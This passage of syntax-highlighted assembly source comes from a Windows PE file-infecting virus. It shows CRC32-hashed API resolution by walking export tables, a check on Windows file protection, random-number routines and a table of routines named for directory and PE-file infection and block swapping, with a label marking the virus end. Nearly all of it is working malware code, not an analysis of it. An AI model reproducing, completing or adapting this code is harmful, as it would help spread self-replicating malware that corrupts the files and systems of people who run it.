</span><span class="sc5">@GetSystemDirectoryA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0593AE7CEh</span><span class="sc0">
</span><span class="sc5">@CreateFileMappingA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">096B2D96Ch</span><span class="sc0">
</span><span class="sc5">@MapViewOfFile</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0797B49ECh</span><span class="sc0">
</span><span class="sc5">@UnmapViewOfFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">094524B42h</span><span class="sc0">
</span><span class="sc5">@SetEndOfFile</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">059994ED6h</span><span class="sc0">
</span><span class="sc5">@GetFileSize</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0EF7D811Bh</span><span class="sc0">
</span><span class="sc5">@GlobalAlloc</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">083A353C3h</span><span class="sc0">
</span><span class="sc5">@GlobalFree</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">05CDF6B6Ah</span><span class="sc0">
</span><span class="sc5">@LoadLibraryA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">04134D1ADh</span><span class="sc0">
</span><span class="sc5">@FreeLibrary</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0AFDF191Fh</span><span class="sc0">
</span><span class="sc5">@GetTickCount</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0613FD7BAh</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0BBh</span><span class="sc0">

                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SFC"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@SfcIsFileProtected</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">06DE8F7ABh</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0BBh</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">""</span><span class="sc0">

</span><span class="sc5">oAPI</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">GetAPIs__</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       EAX - Base address of the library where search the APIs</span><span class="sc0">
</span><span class="sc1">;       ESI - Pointer to an array of CRC32 of the APIs we want to search</span><span class="sc0">
</span><span class="sc1">;       EDI - Pointer to where store the APIs</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       Nothing.</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; EAX = Handle of module</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TmpModuleBase</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">APIS33K</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Get in EAX the CRC32 of API</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc5">callr</span><span class="sc0">   </span><span class="sc5">GetAPI_ET_CRC32</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; Save in [EDI] the API address</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0BBh</span><span class="sc0">             </span><span class="sc1">; There are more APIs in this</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">APIS33K</span><span class="sc0">                         </span><span class="sc1">; library</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; Check if it's the last of</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">""</span><span class="sc0">              </span><span class="sc1">; all them</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">EndOfAPISearch</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; ESI points now to the ASCIIz</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc0">                    </span><span class="sc1">; string of a library... We</span><span class="sc0">
                                                </span><span class="sc1">; need to load it!</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">nxtchr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">                                   </span><span class="sc1">; Reach the end of the lib</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; asciiz name</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">nxtchr</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">GetAPIs__</span><span class="sc0">

</span><span class="sc5">EndOfAPISearch</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndGetAPIs</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">GetAPI_ET_CRC32_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       EAX - CRC32 of the API we want to know its address</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX - API address, NULL if error</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">over_APICRC32_SEH</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Set stack as before</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; signalize the error</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Remove_APICRC32_SEH</span><span class="sc0">       

</span><span class="sc5">over_APICRC32_SEH</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Set new SEH frame</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; Put CRC32 of da api in EDX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Counter</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; Clear this field :)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3Ch</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TmpModuleBase</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Get PE header of module</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TmpModuleBase</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Normalize</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1Ch</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Get a pointer to its edata</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TmpModuleBase</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressTableVA</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Pointer to the address table</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Get AddressTable value</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TmpModuleBase</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Normalize</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; And store in its variable</span><span class="sc0">

    </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Get NameTable value</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TmpModuleBase</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Normalize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; Put it in stack</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; Store in its variable</span><span class="sc0">

    </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Get OrdinalTable value</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TmpModuleBase</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Normalize</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">; Store</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; ESI = NameTable VA</span><span class="sc0">

</span><span class="sc5">@?_3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Get pointer to an API name</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; Save again</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TmpModuleBase</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Normalize</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Store ptr in EDI</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; And in EBX</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Save EDI</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; ESI = Pointer to API Name</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; EDI = API Name size</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; Save API's CRC32</span><span class="sc0">
        </span><span class="sc5">callr</span><span class="sc0">   </span><span class="sc5">CRC32</span><span class="sc0">                           </span><span class="sc1">; Get actual api's CRC32</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; Restore API's CRC32</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Are them equal?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@?_4</span><span class="sc0">                            </span><span class="sc1">; if yes, we got it</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; Restore ptr to api name</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Counter</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; And increase the counter</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@?_3</span><span class="sc0">                            </span><span class="sc1">; Get another api!</span><span class="sc0">
</span><span class="sc5">@?_4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; Remove shit from stack</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Counter</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Put in EAX the number that</span><span class="sc0">
                                                </span><span class="sc1">; the API occupy in list.</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                           </span><span class="sc1">; *2 (it's an array of words)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OrdinalTableVA</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Normalize</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">; ESI = Ptr 2 ordinal; EAX = 0</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">                                   </span><span class="sc1">; Get ordinal in AX</span><span class="sc0">
    </span><span class="sc6">cwde</span><span class="sc0">                                    </span><span class="sc1">; Clear MSW of EAX</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                           </span><span class="sc1">; And with it we go to the</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">AddressTableVA</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; AddressTable (array of</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; dwords)</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Get Address of API RVA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TmpModuleBase</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; and normalize!! That's it!</span><span class="sc0">

</span><span class="sc5">Remove_APICRC32_SEH</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; Remove that SEH frame</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.PUSHAD_EAX</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndGetAPI_ET_CRC32</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">GetRandom</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       Nothing.</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX - Random number</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">GetTickCount</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_seed</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc3">"RAGE"</span><span class="sc0">
</span><span class="sc5">_seed</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndGetRandom</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">GetRandomRange</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       EAX - Range</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       EAX - Random number into that range</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">callr</span><span class="sc0">   </span><span class="sc5">random</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndGetRandomRange</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc1">; ===( End of swappable routines )===========================================</span><span class="sc0">

</span><span class="sc5">end_swap_routines</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">
</span><span class="sc1">; | Routines table                                                          |</span><span class="sc0">
</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">

</span><span class="sc5">routine_info_table</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">rout</span><span class="sc0">    </span><span class="sc5">sign</span><span class="sc4">,</span><span class="sc5">signature</span><span class="sc4">,</span><span class="sc5">signature_end</span><span class="sc0">
        </span><span class="sc5">rout</span><span class="sc0">    </span><span class="sc5">bse</span><span class="sc4">,</span><span class="sc5">block_swapping_engine</span><span class="sc4">,</span><span class="sc5">end_block_swapping_engine</span><span class="sc0">
        </span><span class="sc5">rout</span><span class="sc0">    </span><span class="sc5">InfectDir</span><span class="sc4">,</span><span class="sc5">SetNewDir</span><span class="sc4">&amp;</span><span class="sc5">InfectFilesInDirectory</span><span class="sc4">,</span><span class="sc5">EndSetNewDir</span><span class="sc4">&amp;</span><span class="sc5">InfectFilesInDirectory</span><span class="sc0">
        </span><span class="sc5">rout</span><span class="sc0">    </span><span class="sc5">ProcessExtension</span><span class="sc4">,</span><span class="sc5">ProcessExtension_</span><span class="sc4">,</span><span class="sc5">EndProcessExtension</span><span class="sc0">
        </span><span class="sc5">rout</span><span class="sc0">    </span><span class="sc5">InfectPE</span><span class="sc4">,</span><span class="sc5">InfectPEfile</span><span class="sc4">,</span><span class="sc5">EndInfectPE</span><span class="sc0">
        </span><span class="sc5">rout</span><span class="sc0">    </span><span class="sc5">CheckImageBase</span><span class="sc4">,</span><span class="sc5">CheckImageBase_</span><span class="sc4">,</span><span class="sc5">EndCheckImageBase</span><span class="sc0">
        </span><span class="sc5">rout</span><span class="sc0">    </span><span class="sc5">CRC32</span><span class="sc4">,</span><span class="sc5">CRC32_</span><span class="sc4">,</span><span class="sc5">EndCRC32</span><span class="sc0">
        </span><span class="sc5">rout</span><span class="sc0">    </span><span class="sc5">GetAPIs</span><span class="sc4">,</span><span class="sc5">GetAPIs_</span><span class="sc4">,</span><span class="sc5">EndGetAPIs</span><span class="sc0">
        </span><span class="sc5">rout</span><span class="sc0">    </span><span class="sc5">GetAPI_ET_CRC32</span><span class="sc4">,</span><span class="sc5">GetAPI_ET_CRC32_</span><span class="sc4">,</span><span class="sc5">EndGetAPI_ET_CRC32</span><span class="sc0">
        </span><span class="sc5">rout</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc4">,</span><span class="sc5">GetRandom</span><span class="sc4">,</span><span class="sc5">EndGetRandom</span><span class="sc0">
        </span><span class="sc5">rout</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc4">,</span><span class="sc5">GetRandomRange</span><span class="sc4">,</span><span class="sc5">EndGetRandomRange</span><span class="sc0">
</span><span class="sc5">n_routines</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">    </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">routine_info_table</span><span class="sc4">)/</span><span class="sc5">rit_size</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">virus_end</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">
</span><span class="sc1">; | Data in the heap                                                        |</span><span class="sc0">
</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">

</span><span class="sc5">heap_start</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc0">
</span><span class="sc5">kernel</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">TmpModuleBase</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">AddressTableVA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">NameTableVA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">OrdinalTableVA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Counter</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SearchHandle</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">call_rit</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">buffer</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">new_rit</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">new_rit_mem</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">swapped_blocks</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">swapped_blocks_mem</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">rout_counter</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FileHandle</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">MapHandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">MapAddress</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">temp_esp</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">api_addresses</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc0">
